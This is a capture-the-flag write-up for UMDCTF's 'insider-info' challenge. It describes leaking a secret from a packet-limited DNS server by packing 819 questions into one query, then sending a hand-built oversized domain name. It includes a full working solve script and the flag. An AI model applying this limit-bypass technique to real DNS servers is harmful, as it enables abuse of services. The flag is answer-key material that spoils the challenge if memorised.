**Flag:** `UMDCTF{5Ur31Y_N0_0N3_W111_N071C3_MY_1N51D3r_7r4D1N6}`

**Category:** Misc

**Challenge author:** cephi-sui

***

## Context

This networking and DNS challenge gave me a bit of trouble, but once I figured out what was going on, the resolution was really satisfying.

On the surface, we had to extract information from a tricky DNS server that only accepted two queries before dropping the connection immediately.

## Challenge: insider-info

```"What better way to hide inside info on the Internet? nc challs.umdctf.io 32323"```

We were given the source code (`dns_server.py`) of a DNS server running over TCP. The final goal was to construct a specific subdomain with a "secret" and request the flag from it.

The problem was the limit: the server dropped the connection after just 2 packets. And the secret we needed was 819 characters long, which had to be requested one character at a time (like `0.inside.info`, `1.inside.info`, and so on).

How do you pull 819 pieces of information and then ask for the flag with only 2 shots? That was the whole point of the challenge.

### The vulnerability: Packing everything into a single send

Imagine going to a supermarket where, for some weird rule, you can only go through the checkout twice. Instead of carrying one item at a time, you load up an enormous cart and push it all through at once.

Something very similar happens in the DNS protocol. The server limited the number of *packets* (trips to the checkout), but never validated how many *questions* were packed inside each packet.

So the bypass was pretty straightforward:
- **Shot 1:** We build a single DNS packet containing all 819 questions at once. The server does not notice and returns the entire secret in one go.
- **Shot 2:** With the secret in hand, we construct the giant subdomain and request the flag.

### Obstacles: Fighting the standard and the library

This is where I started getting frustrated and had to bang my head against it for a while to move forward.

To build the flag subdomain in Shot 2, I split the 819-character secret into 63-character chunks separated by dots (which is the per-label limit defined by RFC for domain names).

But when I tried to send this, the `dnslib` library kept throwing errors and would not let me build the packet. Why? Because a domain cannot exceed 255 characters in total according to the standard, and mine was over 800.

**The solution:** Throw the library's validation out the window. I built the DNS packet by hand using raw bytes, bypassing Python's local rules entirely.

Since the server was sometimes unstable and would randomly reset the connection (`ConnectionResetError`), I added a retry loop with a `time.sleep(3)` so it would try again on its own without leaving me hanging.

### Solution

The final script (`solve.py`). I mixed the convenience of `dnslib` for the first phase and pure raw-byte hacking for the second, extracting the flag from the buffer with a regex.

```python
import socket
import re
import time
from dnslib import DNSRecord, DNSQuestion, QTYPE

HOST = "challs.umdctf.io"
PORT = 32323

def recvall(sock, n):
    # Lifesaver function to avoid dropping bytes over the network
    data = b''
    while len(data) < n:
        packet = sock.recv(n - len(data))
        if not packet: return None
        data += packet
    return data

def build_raw_query(domain):
    # Building the query by hand because dnslib cries about the RFC limit
    header = b'\x13\x37\x01\x00\x00\x01\x00\x00\x00\x00\x00\x00'
    qname = b''
    for part in domain.split('.'):
        if part:
            qname += bytes([len(part)]) + part.encode()
    qname += b'\x00'
    footer = b'\x00\x10\x00\x01' 
    return header + qname + footer

def solve():
    print("[*] Phase 1: Loading 819 questions into the cart...")
    q1 = DNSRecord()
    for i in range(819):
        q1.add_question(DNSQuestion(f"{i}.inside.info", QTYPE.TXT))
    
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((HOST, PORT))

    # Sending the first shot over TCP
    data1 = q1.pack()
    s.sendall(len(data1).to_bytes(2, byteorder='big') + data1)

    length = int.from_bytes(recvall(s, 2), byteorder='big')
    resp1 = DNSRecord.parse(recvall(s, length))

    # Reconstructing the secret by sorting the responses
    secret_map = {}
    for rr in resp1.rr:
        try:
            secret_map[int(str(rr.rname).split('.')[0])] = b"".join(rr.rdata.data).decode()
        except ValueError:
            continue
    secret_str = ''.join(secret_map[i] for i in range(819))

    print("[*] Phase 2: Sending the mutant domain in raw bytes...")
    subdomain = '.'.join([secret_str[i:i+63] for i in range(0, 819 - 63 + 1, 63)])
    data2 = build_raw_query(subdomain + ".inside.info")
    
    # Second shot
    s.sendall(len(data2).to_bytes(2, byteorder='big') + data2)

    length2 = int.from_bytes(recvall(s, 2), byteorder='big')
    resp_data2 = recvall(s, length2)

    # Hunting the flag with a regex directly on the bytes
    match = re.search(b'([a-zA-Z0-9_]{3,}\\{.*?\\})', resp_data2)
    if match:
        print(f"\n[+] FLAG: {match.group(1).decode()}\n")
        return True
    return False

# Retry loop to deal with the server's rate limits
if __name__ == "__main__":
    for attempt in range(1, 6):
        try:
            if solve(): break
        except Exception:
            print("[-] Flaky server. Retrying in 3s...")
            time.sleep(3)
```

### Execution and flag obtained

I let it run in my terminal, fighting through network timeouts for a while, until the server finally swallowed our giant domain and spat out the flag.

```
UMDCTF{5Ur31Y_N0_0N3_W111_N071C3_MY_1N51D3r_7r4D1N6}
```

## Lessons learned

* It was made crystal clear that limiting the number of connections is useless if the infrastructure does not validate the payload internally. The DNS protocol is far too flexible.
* Sometimes the hacking tools themselves (like Python libraries) restrict you more than the actual server, precisely because they try to be "correct". Dropping down to raw bytes always saves the day.
* I had to be persistent with exception handling and TCP sockets, but seeing the flag parsed in the console made every headache worth it.